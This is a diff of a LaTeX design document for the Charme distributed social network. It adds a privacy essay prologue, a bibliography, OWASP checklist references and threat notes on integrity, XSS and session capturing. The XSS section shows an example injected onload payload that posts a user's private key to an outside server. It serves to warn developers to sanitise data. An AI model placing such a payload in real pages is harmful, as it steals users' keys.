@@ -12,6 +12,9 @@
 \usepackage{amssymb}
 \usepackage{listings}
 
+\usepackage[style=numeric,backend=bibtex]{biblatex}
+\addbibresource{references.bib}
+
 \lstdefinestyle{JSON2}
 {
     language=JSON,
@@ -32,6 +35,23 @@ Basic cryptographic procedures and other stuff for the distributed social networ
 
 \tableofcontents
  \newpage
+\section{Prologue}
+
+\begin{center}
+I's personal. It's private.
+And it's no one's business but yours.
+\end{center}
+
+These are the first words, of Phil Zimmermann's infamous essay "Why I wrote PGP" from 1991 \cite{PHIL}. 24 year later, electronic communication has gained more and more attention in your everyday life. Today, letters have become instant messages and half of your real world conversations have become social network posts. But while you could be almost sure a letter remained private, today a bunch of stakeholders such as governments, technicians and ad-serving companies has access to data derived from your conversations. 
+Most people I talk to simply give a "I have nothing to hide" as an answer when addressing this point. This may be true, as long as you are not a politician, your are not responsible for a business unit, or do not have anything else to say other people are willing to listen to. Otherwise information about you is always equal to power against you. While your self forgets most of the things you said, it is probably saved in some data center waiting to get parsed by some algorithms. With more and more data you become calculable, your actions can be predicted long before you perform them.
+
+ It is the data governments and ad-serving services are interested in for sure of course. By ad-serving companies data is collected by offering "free" services  to make you buy something later. Unfortunately in this business the one with most data wins.
+
+On the other side you have politicians and trying to expand mass surveillance and ban encryption whenever it is possible \cite{EFF}. With the falling of classic media, such as newspaper and television, social networks also have become the key infrastructure of directing people to information. The heterogeneous  landscape of newspapers and blogs providing different information is slowly fading. Your newsfeed has become the primary navigation source of information. And should not trust a single institution  here, because who controls what you read controls who you become.
+
+
+
+
 
 
 
@@ -76,7 +96,7 @@ $ as the users on server A have public keys of two different servers. }
  
 \subsection{Fundamental Concepts}
 \subsubsection{AES-CBC \label{AESCBC}}
-AES is a fast symmetric encryption algorithm that was standardized in 2001 and is still considered secure, although there exist some attacks on it.
+AES is a fast symmetric encryption algorithm that was standardized in 2001 and is still considered secure, although there exist some attacks on it. The following explanation is based on the lecture slides of Carle et al \cite{carle}.
 
 A key $K_{A,B}$ is used for encryption and decryption by the two parties A and B. 
 Cipher Block Chaining Mode (CBC) ensures that blocks that are identical in the plaintext, are not identical anymore in the chiphertext. This is essential, as otherwise images can still be recognized for example, although they are encrypted. First, a initialization vector (IV) is created:
@@ -267,7 +287,7 @@ This information is also signed using the senders private key.
   
    There is also a new technology called sub resource integrity which can be used to validate Javascript and CSS resources (See \url{http://www.w3.org/TR/SRI/} and \url{http://githubengineering.com/subresource-integrity/}). Maybe they introduce some mechanism to validate a whole web page with a hash recommended by the majority of browser users and additionally located on a (Mozilla or Google) server. So lets keep an eye on that.
 
-   \subsubsection{Attacks on Integrity Protection (OTG-BUSLOGIC-003)}
+   \subsubsection{Attacks on Integrity Protection}
    Certain information, such as the Name/UserID pairs of a conversation must be distributed with integrity protection using either the private key of each receiver or the conversation key. Asymmetric private keys used for signing the message data have the following advantages and disadvantages in contrast to the symmetric conversation key.
    
    \textbf{Using the private key }
@@ -275,6 +295,11 @@ This information is also signed using the senders private key.
    \item (Advantage) Slower (Factor ca. 1000)
     \item (Disadvantage) No attackers inside a conversation manipulating username/userId pairs
    \end{enumerate}
+   
+        
+ 
+   \textbf{Additional Information:}\\
+   OWASP Checklist: OTG-BUSLOGIC-003
    
      \subsubsection{New Conversations with malicious userId/Name pair }
      An attacker can initiate a new conversation with the name of a friend of you, but use another userId instead. Example:
@@ -284,7 +309,7 @@ This information is also signed using the senders private key.
      \item Bob thinks he is talking to Alice, but he is not.
      \end{enumerate}
      A solution for this problem would be to allow only names from the key directory.
-   \subsubsection{XSS (OTG-CLIENT-002)}
+   \subsubsection{XSS}
    One of the most critical attack vectors in Charme is Cross Site Scripting as with this technique private keys can be stolen.
    Therefore it is important to sanitize all displayed data from other people and servers. Never trust the server. For example imaging data is a JSON Object returned by the server:
    
@@ -296,7 +321,14 @@ This information is also signed using the senders private key.
           \begin{lstlisting}
 #'  onload='$.post("someotherserver.com", {key: theprivatekey})
      \end{lstlisting}
-     this is extremly dangerous. Therefore always sanitize data from the server!!!
+     this is extremly dangerous. Therefore always sanitize data from the server!!!\\
+     
+        \textbf{Additional Information:}\\
+   OWASP Checklist: OTG-CLIENT-002
+   
+   \subsubsection{Session Capturing}
+Send JSON request from another Website to host server. Make sure you can not access unencrypted user data such as lists for example.
+
 \subsubsection{DOS}
 Attackers can flood small servers with a lot of requests.
        \subsubsection{Replay attacks}
@@ -549,9 +581,10 @@ For searching contextual posts, it will be necessary to hide the meta informatio
 
 
 \section{Sources}
-As this is not some kind of scientific work I was to lazy to quote every sentence and install BibTex (I will do this if there is some time left...). Instead here are all the used sources at once: 
-\begin{enumerate}
-\item Network Security Lecture @ Munich Technical University, Carle et al,  \url{http://www.net.in.tum.de/de/lehre/ws1415/vorlesungen/network-security/}
-\end{enumerate}
+\printbibliography
+
+
+
+
   
 \end{document}
